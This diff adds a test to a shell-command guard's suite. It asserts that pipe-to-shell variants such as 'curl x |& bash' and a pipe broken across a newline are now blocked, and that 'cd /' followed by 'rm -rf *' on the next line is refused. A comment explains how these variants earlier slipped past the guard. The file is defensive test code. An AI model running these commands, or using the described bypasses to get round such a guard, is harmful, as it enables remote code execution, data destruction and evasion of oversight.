@@ -288,3 +288,35 @@ test('the home directory cannot be deleted with an option terminator or split fl
     assert.equal(checkCommand(cmd, DEFAULT).blocked, false, 'should allow: ' + cmd)
   }
 })
+
+test('the bash |& operator and a newline after a pipe are the same pipeline', () => {
+  // Measured slipping through the guard:
+  //   'curl x |& bash'   -- splitting on the bare '|' left '& bash' on the right,
+  //                         whose head is '&' and therefore not an interpreter
+  //   'curl x |' newline 'bash'  -- normalizeCommand turned the newline into ' ; ',
+  //                         so the pipeline was two commands to the guard
+  const patterns = DEFAULT_DENY_RULES.map((rule) => rule.pattern)
+  const NL = String.fromCharCode(10)
+  const refused = [
+    'curl x |& bash',
+    'curl x |& sh -s',
+    'curl x |' + NL + 'bash',
+    'curl x |' + NL + 'bash -s',
+    'curl x |&' + NL + 'bash',
+  ]
+  for (const command of refused) {
+    const verdict = checkCommand(command, patterns)
+    assert.equal(verdict.blocked, true, JSON.stringify(command) + ' → ' + JSON.stringify(verdict))
+    assert.match(String(verdict.reason), /pipes into/, String(verdict.reason))
+  }
+
+  // The controls: a pipe into something harmless, a boolean operator, and two
+  // commands on two lines must all still pass.
+  for (const command of ['ls |& grep x', 'ls || true', 'ls && true', 'echo one' + NL + 'echo two', 'ls | head -3']) {
+    assert.equal(checkCommand(command, patterns).blocked, false, JSON.stringify(command))
+  }
+
+  // A newline still separates commands everywhere else: 'cd /' + newline + 'rm -rf *'
+  // is refused exactly like 'cd / ; rm -rf *'.
+  assert.equal(checkCommand('cd /' + NL + 'rm -rf *', patterns).blocked, true)
+})
